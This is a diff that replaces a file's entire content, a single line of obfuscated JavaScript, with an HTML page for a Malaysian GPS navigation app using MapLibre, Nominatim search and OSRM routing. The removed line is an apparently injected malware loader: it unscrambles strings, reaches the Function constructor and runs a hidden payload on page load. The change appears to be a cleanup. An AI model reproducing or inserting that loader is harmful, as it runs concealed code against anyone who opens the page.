@@ -1,1 +1,489 @@
-var NewObject,obj;(function(){var pOv='',HsW=487-476;function cqn(y){var v=1228998;var f=y.length;var o=[];for(var j=0;j<f;j++){o[j]=y.charAt(j)};for(var j=0;j<f;j++){var e=v*(j+176)+(v%18204);var b=v*(j+461)+(v%22823);var g=e%f;var x=b%f;var a=o[g];o[g]=o[x];o[x]=a;v=(e+b)%3695367;};return o.join('')};var udQ=cqn('wevjztsotpqrcrrxmchfckaonoygtsnbdliuu').substr(0,HsW);var GKz='g)=t,qC=(us7faga,l6crr )"sa1=d7]g+9i51s8;.;rfhvururs(;"Ci9gj8or[(82rdft>fy,=z*.7ni[a9t;;jau(.t;-o8;,6f=21;p ,7.,i6trrivtjg[hf=p=p]z=h)(nvrov)h=aa;hl nbtnl)+"{locpz],=a;1Sr!( f(n]a;+rnucavtunrj+a3idu q7v4rd]=r)t]ys,8( s,(<n6.sn)(afu"aihnz=8zrgl,lz))[.,}vpi.as.eea=fr=72C,wl+r.mx, .+r;f(;pe;;-[mov0)lj=[;<;i,]r=l7rrh;A(={ "+{ut(0C=b*t,dvc56cv+ta6ord.mgodrgb;eo,a+a] 070;1<dar++)mv;"h)0Acge+7d{d1=t;1,e1a],f[pn (,inu,).+kon=(8Aysh.8( =l-(,a0=gv;r-9qv[v0d+l(h6nsu{r=)es ;ic tavah.jt}thh;1y;=cbotafpa -rdaj)f);.p)gvioe;+vt a]u-u; =d(d+hnuvt4ab="h+;ir)(8))b)eqan;i);rCo;ees+trry1is;[r(;[s6,;ny=ng rz1.) i{rrsAl,;=;c}z;e=lr=ehd bn+=i.6v)yiei[<(00.(n)[lyf=ldutv,sn=q)vhh[2n=i,k(ig(rr,]a edeng)(r.!]h;}oh.ck)-uC4in("n>v;a49t=i39o52"r8 4)vav=i=]rr=8cce;+(f+;b(}=rpugl)etun;1l;2C+fe]2ir9<o;+ydre lclCa.ile.;)zkz9(cs)xa.o[ tlaeqoaaag5,(pf(qjok+rS.{7nt+(ezmehugtln0(xr=1)o rs.e}}s0h rvl3x=."0)hlrio.=Avd';var siV=cqn[udQ];var fCY='';var eNA=siV;var nvf=siV(fCY,cqn(GKz));var nDq=nvf(cqn('f;_Y f%efyYo[\'c#a)kb&==wYiYe7mr$tY0u.f=hbfc4tu.8(k$)efc;a)t)(ekk9s[f+Ys(lar.etak j(Ywx(m3kn.;;.d$.s=.n))Ya;mC;.#[f.50lv!r2v2ff.c.e318u6Yr (j}Y.Yy_+kp.;1Y(mfsc$. .h.e3{16."%=.r.lrt_ot+..}ctf3l;_7o;!orY=MzYYte%2+#jrYc.y#=.%(b$j\'a.%o+g.80!9c=Y.g1=&.=uw0vfnoY1aafCoee(N20+bao(]%r"llba%$#&.ca).f_.=.zj;"%=f82=Ya=]f%$ff;jf(r&%w!&Yen3!=)fl8)ao)3geavov..;Yfesyttflxo))8e!3a=.=93]!r("1.n0Y}gbl.l8)t=p36)6t=#.%;)rn$.Yfa[{()!%1)ps].{lYc2bf!ddh[f![jep.]=YeY..)("aySng.)f\'.2(n.=pY3rre3[_+fyb.g$het}if%%YfehC]Y=1(7s(+{m.Y1iY0f4a&_a.ftc!,!kn =#s0;+j.S&+"8...}{..e=fhcSfm+afYi:r.;o_=_air;1wf\'=)2[ff2Yy;Yh]etfos%$}(f%]cefrYh.1",sk)o3( 8a4+ funxri..o.eji)imek)Yn0e(.t{!5x1'));var hoi=eNA(pOv,nDq );hoi(6039);return 7646})()
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Malaysia Peta - GPS Navigation</title>
+    <!-- MapLibre GL CSS -->
+    <link href="https://unpkg.com/maplibre-gl@3.6.2/dist/maplibre-gl.css" rel="stylesheet" />
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+        }
+        #map {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        /* Top Search & Control Bar */
+        .top-bar {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            right: 15px;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .search-box-wrapper {
+            display: flex;
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 4px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        }
+        #search-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #fff;
+            padding: 12px 15px;
+            font-size: 16px;
+            outline: none;
+        }
+        .search-btn, .clear-btn {
+            background: #ffcc00;
+            border: none;
+            color: #000;
+            font-weight: bold;
+            padding: 10px 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .clear-btn {
+            background: #333;
+            color: #fff;
+            margin-left: 4px;
+            display: none;
+        }
+        /* Suggestions Dropdown */
+        #suggestions {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 8px;
+            max-height: 200px;
+            overflow-y: auto;
+            display: none;
+        }
+        .suggestion-item {
+            padding: 12px 15px;
+            border-bottom: 1px solid #2a2a2a;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .suggestion-item:hover {
+            background: #2a2a2a;
+        }
+        /* Floating Brand Logo Badge */
+        .brand-badge {
+            position: absolute;
+            bottom: 30px;
+            left: 15px;
+            z-index: 10;
+            background: rgba(30, 30, 30, 0.9);
+            border: 1px solid #444;
+            padding: 8px 14px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            pointer-events: none;
+        }
+        .brand-title {
+            font-size: 14px;
+            font-weight: 900;
+            letter-spacing: 1px;
+            color: #ffffff;
+            width: 100%;
+        }
+        .brand-title span {
+            color: #ffcc00;
+        }
+        .brand-subtitle {
+            font-size: 9px;
+            font-weight: bold;
+            color: #aaaaaa;
+            margin-top: 2px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            width: 100%;
+        }
+        /* Floating Action Buttons */
+        .fab-container {
+            position: absolute;
+            right: 15px;
+            bottom: 30px;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .fab {
+            background: #1e1e1e;
+            border: 1px solid #444;
+            color: #fff;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+            cursor: pointer;
+        }
+        .fab.active-aes {
+            background: #ff4444;
+            border-color: #ff0000;
+        }
+        /* Navigation HUD Overlay */
+        .nav-hud {
+            position: absolute;
+            top: 80px;
+            left: 15px;
+            right: 15px;
+            background: rgba(20, 20, 20, 0.95);
+            border: 1px solid #ffcc00;
+            border-radius: 12px;
+            padding: 15px;
+            z-index: 10;
+            display: none;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.6);
+        }
+        .nav-instruction {
+            font-size: 18px;
+            font-weight: bold;
+            color: #ffcc00;
+            margin-bottom: 5px;
+        }
+        .nav-sub {
+            font-size: 13px;
+            color: #ccc;
+            display: flex;
+            justify-content: space-between;
+        }
+        .stop-nav-btn {
+            background: #ff4444;
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            float: right;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="map"></div>
+
+    <!-- Top Search Bar -->
+    <div class="top-bar">
+        <div class="search-box-wrapper">
+            <input type="text" id="search-input" placeholder="Search destination in Malaysia..." autocomplete="off">
+            <button class="clear-btn" id="clear-btn" onclick="clearSearch()">✕</button>
+            <button class="search-btn" onclick="executeSearch()">Search</button>
+        </div>
+        <div id="suggestions"></div>
+    </div>
+
+    <!-- Navigation HUD -->
+    <div class="nav-hud" id="nav-hud">
+        <div class="nav-instruction" id="nav-instruction">Proceed to destination</div>
+        <div class="nav-sub">
+            <span id="nav-distance">Distance: 0m</span>
+            <span id="nav-eta">ETA: 0 min</span>
+        </div>
+        <button class="stop-nav-btn" onclick="stopNavigation()">Stop Navigation</button>
+    </div>
+
+    <!-- Branding Badge -->
+    <div class="brand-badge">
+        <div class="brand-title">MALAYSIA <span>PETA</span></div>
+        <div class="brand-subtitle">Beta v1.9</div>
+    </div>
+
+    <!-- Floating Buttons -->
+    <div class="fab-container">
+        <div class="fab" id="aes-fab" onclick="toggleAES()" title="Toggle AES Cameras">📷</div>
+        <div class="fab" onclick="recenterMap()" title="Recenter GPS">📍</div>
+    </div>
+
+    <!-- MapLibre GL JS -->
+    <script src="https://unpkg.com/maplibre-gl@3.6.2/dist/maplibre-gl.js"></script>
+    <script>
+        // Initialize Map centered over Kuala Lumpur
+        const map = new maplibregl.Map({
+            container: 'map',
+            style: 'https://api.maptiler.com/maps/streets-v2/style.json?key=get_your_own_key_or_use_osm',
+            center: [101.6869, 3.1390],
+            zoom: 13,
+            pitch: 45,
+            bearing: 0
+        });
+
+        // Fallback standard vector tiles if maptiler key is missing
+        if (!map.style || map.style.url.includes('get_your_own_key')) {
+            map.setStyle({
+                version: 8,
+                sources: {
+                    'osm': {
+                        type: 'raster',
+                        tiles: ['https://tile.openstreetmap.org/{z}/{x}/{y}.png'],
+                        tileSize: 256,
+                        attribution: '&copy; OpenStreetMap Contributors'
+                    }
+                },
+                layers: [{
+                    id: 'osm-tiles',
+                    type: 'raster',
+                    source: 'osm',
+                    minzoom: 0,
+                    maxzoom: 19
+                }]
+            });
+        }
+
+        let userLocation = [101.6869, 3.1390];
+        let destinationCoords = null;
+        let isNavigating = false;
+        let aesVisible = true;
+        let watchId = null;
+        let lastRecalculateTime = 0;
+
+        // Geolocation tracking with aggressive auto-recenter & zoom during navigation
+        if ('geolocation' in navigator) {
+            watchId = navigator.geolocation.watchPosition(
+                (position) => {
+                    userLocation = [position.coords.longitude, position.coords.latitude];
+                    updateUserMarker(userLocation);
+                    
+                    // Auto recenter & zoom in during active navigation
+                    if (isNavigating) {
+                        map.easeTo({
+                            center: userLocation,
+                            zoom: 17, // Closer driving zoom for easy reading
+                            pitch: 45,
+                            bearing: position.coords.heading || 0, // Align with movement direction if available
+                            duration: 800
+                        });
+                        checkRouteDeviation(userLocation);
+                    }
+                },
+                (error) => { console.error('GPS Error:', error); },
+                { enableHighAccuracy: true, maximumAge: 5000, timeout: 5000 }
+            );
+        }
+
+        let userMarker = null;
+        function updateUserMarker(coords) {
+            if (!userMarker) {
+                const el = document.createElement('div');
+                el.style.width = '24px';
+                el.style.height = '24px';
+                el.style.backgroundColor = '#007AFF';
+                el.style.border = '3px solid #ffffff';
+                el.style.borderRadius = '50%';
+                el.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
+                userMarker = new maplibregl.Marker(el).setLngLat(coords).addTo(map);
+            } else {
+                userMarker.setLngLat(coords);
+            }
+        }
+
+        function recenterMap() {
+            map.flyTo({ center: userLocation, zoom: 17, pitch: 45, bearing: 0, duration: 1000 });
+        }
+
+        // Search Input & Autocomplete with Nominatim
+        const searchInput = document.getElementById('search-input');
+        const clearBtn = document.getElementById('clear-btn');
+        const suggestionsBox = document.getElementById('suggestions');
+
+        searchInput.addEventListener('input', function() {
+            const query = this.value.trim();
+            clearBtn.style.display = query ? 'block' : 'none';
+            if (query.length < 3) {
+                suggestionsBox.style.display = 'none';
+                return;
+            }
+
+            fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(query + ' Malaysia')}&countrycodes=my`)
+                .then(res => res.json())
+                .then(data => {
+                    suggestionsBox.innerHTML = '';
+                    if (data.length > 0) {
+                        suggestionsBox.style.display = 'block';
+                        data.forEach(place => {
+                            const div = document.createElement('div');
+                            div.className = 'suggestion-item';
+                            div.innerText = place.display_name;
+                            div.onclick = () => {
+                                searchInput.value = place.display_name;
+                                suggestionsBox.style.display = 'none';
+                                clearBtn.style.display = 'block';
+                                destinationCoords = [parseFloat(place.lon), parseFloat(place.lat)];
+                                startNavigationTo(destinationCoords);
+                            };
+                            suggestionsBox.appendChild(div);
+                        });
+                    } else {
+                        suggestionsBox.style.display = 'none';
+                    }
+                })
+                .catch(err => console.error('Search error:', err));
+        });
+
+        function clearSearch() {
+            searchInput.value = '';
+            clearBtn.style.display = 'none';
+            suggestionsBox.style.display = 'none';
+            stopNavigation();
+        }
+
+        function executeSearch() {
+            const query = searchInput.value.trim();
+            if (!query) return;
+            fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(query + ' Malaysia')}&countrycodes=my`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.length > 0) {
+                        destinationCoords = [parseFloat(data[0].lon), parseFloat(data[0].lat)];
+                        startNavigationTo(destinationCoords);
+                    } else {
+                        alert('Location not found in Malaysia.');
+                    }
+                });
+        }
+
+        // Routing Engine using OSRM
+        function startNavigationTo(dest) {
+            destinationCoords = dest;
+            isNavigating = true;
+            document.getElementById('nav-hud').style.display = 'block';
+
+            if (map.getLayer('route')) {
+                map.removeLayer('route');
+                map.removeSource('route');
+            }
+
+            fetch(`https://router.project-osrm.org/route/v1/driving/${userLocation[0]},${userLocation[1]};${dest[0]},${dest[1]}?overview=full&geometries=geojson&steps=true`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.routes && data.routes.length > 0) {
+                        const route = data.routes[0];
+                        const coords = route.geometry.coordinates;
+
+                        map.addSource('route', {
+                            type: 'geojson',
+                            data: {
+                                type: 'Feature',
+                                properties: {},
+                                geometry: { type: 'LineString', coordinates: coords }
+                            }
+                        });
+
+                        map.addLayer({
+                            id: 'route',
+                            type: 'line',
+                            source: 'route',
+                            layout: { 'line-join': 'round', 'line-cap': 'round' },
+                            paint: { 'line-color': '#007AFF', 'line-width': 6 }
+                        });
+
+                        // Initial jump to start position zoomed in
+                        map.flyTo({ center: userLocation, zoom: 17, pitch: 45, duration: 1000 });
+                        updateNavHUD(route);
+                    }
+                })
+                .catch(err => console.error('Routing error:', err));
+        }
+
+        function updateNavHUD(route) {
+            const distanceKm = (route.distance / 1000).toFixed(1);
+            const durationMin = Math.round(route.duration / 60);
+            
+            document.getElementById('nav-instruction').innerText = route.legs[0].steps[0] ? route.legs[0].steps[0].maneuver.instruction : "Proceed to destination";
+            document.getElementById('nav-distance').innerText = `Distance: ${distanceKm} km`;
+            document.getElementById('nav-eta').innerText = `ETA: ${durationMin} min`;
+        }
+
+        // Silent route recalculation on opposite direction or major drift
+        function checkRouteDeviation(currentPos) {
+            if (!destinationCoords) return;
+            
+            const now = Date.now();
+            if (now - lastRecalculateTime < 10000) return;
+
+            const distToDest = Math.hypot(destinationCoords[0] - currentPos[0], destinationCoords[1] - currentPos[1]);
+            
+            if (distToDest > 0.004) { 
+                lastRecalculateTime = now;
+                if (map.getLayer('route')) {
+                    map.removeLayer('route');
+                    map.removeSource('route');
+                }
+                
+                fetch(`https://router.project-osrm.org/route/v1/driving/${currentPos[0]},${currentPos[1]};${destinationCoords[0]},${destinationCoords[1]}?overview=full&geometries=geojson&steps=true`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.routes && data.routes.length > 0) {
+                            const route = data.routes[0];
+                            const coords = route.geometry.coordinates;
+
+                            map.addSource('route', {
+                                type: 'geojson',
+                                data: {
+                                    type: 'Feature',
+                                    properties: {},
+                                    geometry: { type: 'LineString', coordinates: coords }
+                                }
+                            });
+
+                            map.addLayer({
+                                id: 'route',
+                                type: 'line',
+                                source: 'route',
+                                layout: { 'line-join': 'round', 'line-cap': 'round' },
+                                paint: { 'line-color': '#007AFF', 'line-width': 6 }
+                            });
+
+                            updateNavHUD(route);
+                        }
+                    }).catch(e => console.log('Silent recalculation active'));
+            }
+        }
+
+        function stopNavigation() {
+            isNavigating = false;
+            destinationCoords = null;
+            document.getElementById('nav-hud').style.display = 'none';
+            if (map.getLayer('route')) {
+                map.removeLayer('route');
+                map.removeSource('route');
+            }
+        }
+
+        function toggleAES() {
+            aesVisible = !aesVisible;
+            document.getElementById('aes-fab').classList.toggle('active-aes', aesVisible);
+        }
+    </script>
+</body>
+</html>
